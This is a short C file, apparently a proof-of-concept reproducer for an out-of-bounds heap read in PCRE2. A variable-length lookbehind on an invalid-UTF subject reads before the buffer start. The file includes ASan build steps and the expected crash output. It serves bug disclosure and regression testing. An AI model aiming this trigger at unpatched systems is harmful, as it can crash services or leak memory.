/* Residual OOB PoC: variable-length lookbehind (OP_VREVERSE) backward scan on
   an invalid-UTF subject reads before the validated subject start.

   Public API only: pcre2_compile + pcre2_match with PCRE2_MATCH_INVALID_UTF.
   The subject is a lone UTF-8 continuation byte (0x80) followed by 'X'. With
   PCRE2_MATCH_INVALID_UTF the validated region starts after the bad byte, but
   the variable lookbehind's backward step walks past it into the invalid
   prefix and off the front of the subject buffer.

   Build (8-bit library, ASan):
     cc -I<builddir> -fsanitize=address -g poc.c libpcre2-8.a -o poc
   Expected: AddressSanitizer heap-buffer-overflow (READ) on the shipped tree;
   clean "no match" on the upstream-fixed tree. */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
  /* Exact-size allocation so a read before the start hits the ASan redzone. */
  const size_t n = 2;
  unsigned char *subject = (unsigned char *)malloc(n);
  subject[0] = 0x80;   /* isolated UTF-8 continuation byte (invalid prefix) */
  subject[1] = 'X';

  int errnum;
  PCRE2_SIZE erroff;
  pcre2_code *re = pcre2_compile((PCRE2_SPTR)"(?<=a{1,2})X",
      PCRE2_ZERO_TERMINATED, PCRE2_UTF | PCRE2_MATCH_INVALID_UTF,
      &errnum, &erroff, NULL);
  if (re == NULL)
    {
    PCRE2_UCHAR buf[256];
    pcre2_get_error_message(errnum, buf, sizeof(buf));
    fprintf(stderr, "compile failed at %d: %s\n", (int)erroff, buf);
    return 2;
    }

  pcre2_match_data *md = pcre2_match_data_create_from_pattern(re, NULL);
  int rc = pcre2_match(re, (PCRE2_SPTR)subject, n, 0, 0, md, NULL);
  printf("match rc = %d\n", rc);

  pcre2_match_data_free(md);
  pcre2_code_free(re);
  free(subject);
  return 0;
}
